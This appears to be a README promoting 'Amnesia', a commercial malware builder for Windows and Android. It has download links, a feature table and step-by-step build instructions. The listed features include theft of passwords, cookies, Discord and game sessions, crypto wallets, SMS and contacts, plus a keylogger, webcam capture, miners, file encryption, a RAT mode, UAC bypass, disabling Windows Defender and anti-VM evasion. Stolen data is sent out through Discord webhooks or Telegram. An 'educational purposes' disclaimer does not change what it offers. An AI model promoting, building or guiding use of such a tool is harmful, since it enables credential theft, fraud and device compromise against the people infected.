<div align="center">
  <div>
    <img src="http://138.2.138.250:8080/logo.png">
  </div>
</div>

<p align="center">
  🔥 <a href="https://amnesia333.store/" style="color: white; background-color: #0566f7; padding: 15px 32px; border-radius: 5px; text-decoration: none; font-size: 16px;">Download</a> 🔥


<p align="center">
  <hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
</p>

## Table of Contents

- [Download](#download)
- [Features](#features)
- [Stub Settings](#stub-settings)
- [Requirements](#requirements)
- [How to Build?](#how-to-build)
- [VIP Version](#vip-version)

## Download

<p align="center">
  🔥 <a href="https://amnesia333.store/" style="color: white; background-color: #0566f7; padding: 15px 32px; border-radius: 5px; text-decoration: none; font-size: 16px;">Download</a> 🔥

  <hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
</p>


**Disclaimer:** This program is provided for educational and research purposes only. The creator of this program does not condone or support any illegal or malicious activity, and will not be held responsible for any such actions taken by others who may use this program. By downloading or using this program, you acknowledge that you are solely responsible for any consequences that may result from the use of this program.

## Features



| FREE Features | VIP Features | Exclusive Android Features |
| ------------- | ------------- | -------------------------- |
| ✅ GUI Builder | 💎 UAC Bypass | 📱 Steal Contacts           |
| ✅ Runs On Startup | 💎 Custom Icon | 📱 Steal SMS             |
| ✅ Fake Error | 💎 Disables Windows Defender | 📱 Steal Call List |
| ✅ EXE Binder | 💎 Melt Stub | 📱 Steal Notifications     |
| ✅ File Pumper | 💎 Anti-VM | |
| ✅ Obfuscated Code | 💎 Recording Audio from a Microphone | |
| ✅ Discord Injection | 💎 Blocks AV-Related Sites | |
| ✅ Steals Discord Tokens | 💎 Steals Riot Session | |
| ✅ Steals Steam Session | 💎 Crypt Stealer | |
| ✅ Steals Epic Session | 💎 XMR Miner | |
| ✅ Steals Uplay Session | 💎 ETC Miner | |
| ✅ Steals Battle.Net Session | 💎 Steals Installed Software List | |
| ✅ Steals Passwords From Many Browsers | 💎 Steals WhatsApp Session Files | |
| ✅ Steals Cookies From Many Browsers | 💎 Uninstall Program | |
| ✅ Steals History From Many Browsers | 💎 RAT Mode | |
| ✅ Steals Autofills From Many Browsers | 💎 Speak Text | |
| ✅ Steals Minecraft Session Files | 💎 Open URL | |
| ✅ Steals Telegram Session Files | 💎 Encrypt User Files | |
| ✅ Steals Crypto Wallets | 💎 Kill Process | |
| ✅ Steals Roblox Cookies | 💎 Steals Startup List | |
| ✅ Steals Growtopia Session | 💎 Keylogger | |
| ✅ Steals IP Information | 💎 Clipper | |
| ✅ Steals System Info | 💎 Android Support | |
| ✅ Steals Saved Wifi Passwords | | |
| ✅ Steals Common Files | | |
| ✅ Captures Screenshot | | |
| ✅ Captures Webcam Image | | |
| ✅ Sends All Data Through Discord Webhooks/Telegram Bot | | |

<div style="display: flex; justify-content: center;">
  <div style="flex: 1; padding: 10px;">
    <img src="http://138.2.138.250:8080/window.png" style="width: 100%;">
  </div>
  <div style="flex: 1; padding: 10px;">
    <img src="http://138.2.138.250:8080/screens.png" style="width: 100%;">
  </div>
</div>

## Stub Settings

<p align="center">
  <img src="http://138.2.138.250:8080/msg.png"/>
</p>

| Option | Description |
| ------ | ----------- |
| **Ping Me** | Pings [@everyone](https://www.remote.tools/remote-work/discord-everyone-here#what-is-everyone) when someone runs the stub. |
| **Anti VM** | Tries its best to prevent the stub from running on Virtual Machine. |
| **Put On Startup** | Runs the stub on Windows startup. |
| **Melt Stub** | Deletes the stub after use. |
| **Pump Stub** | Pumps the stub up to the provided size. |
| **Fake Error** | Create custom (fake) error. |
| **Block AV Sites** | Blocks AV related sites. |
| **Discord Injection** | Puts backdoor on the Discord client for persistence. |
| **UAC Bypass** | Tries to get administrator permissions without showing any prompt. |

**Supports:** *Windows 7+*/*Android 5+*

## Requirements

### For Windows

- **Operating System:** Windows 7 or higher.
- **Programming Language:** Python 3.10 installed (do not use a higher version). Make sure the *Add to PATH* option is enabled during installation.
- **Internet Connection:** An active connection is required.

### For Android

- **Operating System:** Android 5 or higher.
- **Internet Connection:** An active connection is required.
  
> **Note:** Amnesia Builder is unstable on Android 13 and higher.

## How to Build on Windows?

1. **Install Python 3.10:**
   - Download and install [Python 3.10](https://www.python.org/ftp/python/3.10.11/python-3.10.11-amd64.exe). Ensure the *Add to PATH* option is selected during setup.
  
2. **Verify Installation:**
   - Open the Command Prompt (CMD) and run the command `python --version` to confirm the correct installation. For more guidance, refer to this [CMD guide](https://www.howtogeek.com/235101/10-ways-to-open-the-command-prompt-in-windows-10/?).

3. **Download Amnesia:**
   - Obtain the latest version by following the [Download link](https://amnesia333.store/).

4. **Extract the Files:**
   - Unzip the downloaded file and navigate to the extracted **Amnesia** folder. Instructions on how to extract files can be found [here](https://www.pcworld.com/article/394871/how-to-unzip-files-in-windows-10.html#:~:text=Unzip%20all%20files%20in%20a%20ZIP%20file).

5. **Build the Stub:**
   - In the **Amnesia** folder, locate and double-click the *Builder.bat* file.
   - Fill in the required fields in the builder interface and click the <kbd>Build</kbd> button.

> **Note:** The password to access the logs archive is "amnesia".
